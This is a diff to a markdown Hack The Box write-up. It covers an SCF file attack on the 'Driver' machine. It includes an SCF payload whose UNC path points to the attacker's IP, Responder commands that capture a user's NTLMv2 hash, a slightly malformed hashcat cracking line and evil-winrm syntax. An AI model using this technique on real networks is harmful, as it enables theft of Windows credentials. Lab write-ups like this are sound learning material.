@@ -21,12 +21,11 @@ output: html_document
 </div>
 
 **Ports/services exploited:** 80/http, 445/SMB\\
-**Tools:** autorecon, msfvenom\\
-**Techniques:** SCF Files attacks\\
-**Keywords:** HP MultiFonction Printer, SMB NT LM 0.12 dialect, MS10-012 (NTLM Weak Nonce), MS08-068 (SMB Relay Code Execution)
+**Tools:** autorecon, msfvenom, responder, hashcat\\
+**Techniques:** SCF (Shell Command Files) attacks\\
+**Keywords:** HP MultiFonction Printer, SMB NT LM 0.12 dialect, SCF, NTLV2, MS10-012 (NTLM Weak Nonce), MS08-068 (SMB Relay Code Execution)
 
-**TL;DR**: ?
-
+**TL;DR**: The host is running a web sever with an application that requires authentication. It appears to be a "MFP Firmware Update Center", and the default credentials admin/admin grant us access to the application, where it is possible to upload files. There's also SMB running, and this latter uses a dialect (NT LM 0.12) that is vulnerable to SCF. We can then create a SCF and upload it on the server. The user browsing to the share will trigger the execution of the SCF, resulting in him/her connecting to the share specified in the SCF. The tool *responder* can be used to capture the user's password hash.
 
 ## 1. Services enumeration
 {:style="color:DarkRed; font-size: 170%;"}
@@ -117,9 +116,72 @@ payload. To exploit this, the target system	must try to	authenticate to this mod
 is by embedding a UNC path (\\\\SERVER\\SHARE) into a web page or email message. When the victim views the web page or email, their 
 system will automatically connect to the server specified in the UNC share (the IP address of the system running this module) and attempt to authenticate.
 
-By searching *searchsploit smb relay*, we find an existing exploit. On *Metasploit*, this latter is rated excellent. However, looking at its options it seems we need to have access to the *ADMIN$* share, which we don't... As usual, I had to look for hints on the forum and it turns out we have to look at **SCF File Attacks**.
+By searching *searchsploit smb relay*, we find an existing exploit. On *Metasploit*, this latter is rated excellent. However, looking at its options it seems we need to have access to the *ADMIN$* share, which we don't... As usual, I had to look for hints on the forum and it turns out we have to look at **SCF File Attacks**. I'll resume the article available <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">here</a>: 
+
+Even if an SMB share doesn't contain anything, it could be configured with writ permissions for unauthenticated users. If this is the case, it is possible to obtain password hashes of domain users, or meterpreter shells. SCF (Shell Command Files) can be used to open a Windows explorer or other limited operations, but it can also be used to access a specific UNC path, allowing a malicious user to build an attack. For example, the SCF syntax to toggle the Desktop is the following:
+
+````
+[Shell]
+Command=2
+IconFile=\\X.X.X.X\share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+`````
+
+This code has to be placed inside a text file and then uploaded into a network share. So, if the files we submit on the server are indeed uploaded in a share, then it could work! What's interesting is that saving the file as SCF will make the file to be executed when the user browses to it. In our case, there is obviously not someone who will manually review the file (even though it is said so on the server), but there's most likely a cronjob reading it.\\
+Also, adding a "@" before the file name will place the file at the top of the list (@example.scf).
+
+Then, the article says we have to use *responder* to capture the hashes of the users who will browse to that share and execute our file. I didn't know about this tool at all, but it is available on Github (<a href="https://github.com/lgandx/Responder">link</a>) where we learn that "*Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication*". Well, I don't really understand what that means but we'll use it as a black box. It turns out that *responder* is already installed on Kali. Let's look at the help page with *responder -h*. We see the usage is:
+
+````
+responder -I eth0 -w -r -f
+``````
+
+Where:
+
+- *-I*: specifies the network interface to use, here *eth0*
+- *w*: starts the WPAD rogue proxy server
+- *r*: enables answers for netbios wredir suffix queries
+- *-f*: allows us to fingerprint a host that issued an NBT-NS or LLMNR query
+
+So, when the "user" will execute our SCF by browsing to the share, it will automatically connect back to the UNC path specified in the SCF file. Then, Windows will try to authenticate to that share with the user's credentials. The idea is to steal those credentials. It is possible because during the autentication process, a random 8 byte challenge key is sent from the server to the client. This key is used to encrypt the hashed NTLM/LANMAN password, and *responder* allows us to capture the NTLMv2 hash.\\
+Note that we could use Metasploit's auxiliary module *auxiliary/server/capture/smb* instead of *responder*.
+
+Enough theory, let's try it! We start by creating the SCF and naming it "@test.scf":
+
+```
+[Shell]
+Command=2
+IconFile=\\10.10.14.11\share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+````
+
+Before uploading the file on the server, we start *responder*:
+
+````
+sudo responder -I tun0 -w -r -f
+`````
+Note that we want to listen on thee *tun0* interface, which is associated with HtB. Let's look at the results:
+
+<div class="img_container">
+![responder]({{https://jsom1.github.io/}}/_images/htb_driver_resp.png)
+</div>
+
+<div class="img_container">
+![hash]({{https://jsom1.github.io/}}/_images/htb_driver_hash.png)
+</div>
+
+It worked! We see the user *tony* authenticated and *responder* captured the NTLMv2 hash. In the article, it is then said that this technique can be combined with SMB relay (we saw an exploit earlier) to get meterpreter reverse shells. Before doing so however, let's just try to crack the hash. If we manage to do so, we might also be able to use *evil-winrm* since we saw port 5985 is open (I used it in <a href="/_walkthroughs/Atom">Atom</a>, where there's more information about it).
+
+hashcat -m tony.hash /usr/share/wordlists/rockyou.txt --force
 
 
+win-rm syntax:
+
+````
+evil-winrm -u username -p 'password' -i targetip
+`````
 
 
 ## 3. Vertical privilege escalation
